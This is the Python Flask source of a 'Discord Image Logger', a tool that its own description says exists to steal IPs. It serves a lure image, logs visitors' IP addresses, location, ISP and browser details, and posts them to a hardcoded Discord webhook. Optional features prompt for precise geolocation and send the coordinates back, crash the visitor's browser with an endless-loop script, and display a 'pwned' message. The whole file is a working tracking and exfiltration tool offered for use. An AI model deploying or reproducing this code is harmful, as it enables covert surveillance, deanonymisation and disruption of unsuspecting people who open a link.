from flask import Flask, request, redirect
import traceback
import requests
import base64
import httpagentparser

app = Flask(__name__)

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1537061698920390716/vGs9uAzKxtxi_hUAfXMtrclVw4qeN0Eu76vLP-4DPwzsvNKzZljDwmPIfEGOE5lOOow7",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    ping = "@everyone"
    info = {"isp": "Unknown", "as": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "UTC/UTC", "mobile": False, "proxy": False, "hosting": False}
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
    except:
        pass

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent if useragent else "")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def handleRequest(path):
    try:
        client_ip = request.headers.get('x-forwarded-for', request.remote_addr)
        user_agent = request.headers.get('user-agent', '')
        s = request.full_path if request.query_string else request.path

        if client_ip and client_ip.startswith(blacklistedIPs):
            return "", 200

        if config["imageArgument"]:
            dic = request.args
            if dic.get("url") or dic.get("id"):
                try:
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        if botCheck(client_ip, user_agent):
            if config["buggedImage"]:
                makeReport(client_ip, useragent=user_agent, endpoint=request.path, url=url)
                return binaries["loading"], 200, {'Content-Type': 'image/jpeg'}
            else:
                makeReport(client_ip, useragent=user_agent, endpoint=request.path, url=url)
                return redirect(url, code=302)

        dic = request.args
        coords = None
        if dic.get("g") and config["accurateLocation"]:
            try:
                coords = base64.b64decode(dic.get("g").encode()).decode()
            except:
                pass
            result = makeReport(client_ip, useragent=user_agent, coords=coords, endpoint=request.path, url=url)
        else:
            result = makeReport(client_ip, useragent=user_agent, endpoint=request.path, url=url)

        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", client_ip)
            message = message.replace("{isp}", result.get("isp", ""))
            message = message.replace("{country}", result.get("country", ""))
            message = message.replace("{city}", result.get("city", ""))

        if config["message"]["doMessage"]:
            data = message
        else:
            data = f'''<style>body {{ margin: 0; padding: 0; }} div.img {{ background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}</style><div class="img"></div>'''

        if config["crashBrowser"]:
            data += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        if config["redirect"]["redirect"]:
            return f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">', 200, {'Content-Type': 'text/html'}

        if config["accurateLocation"]:
            data += """<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""

        return data, 200, {'Content-Type': 'text/html'}

    except Exception as e:
        reportError(traceback.format_exc())
        return "500 - Internal Server Error", 500
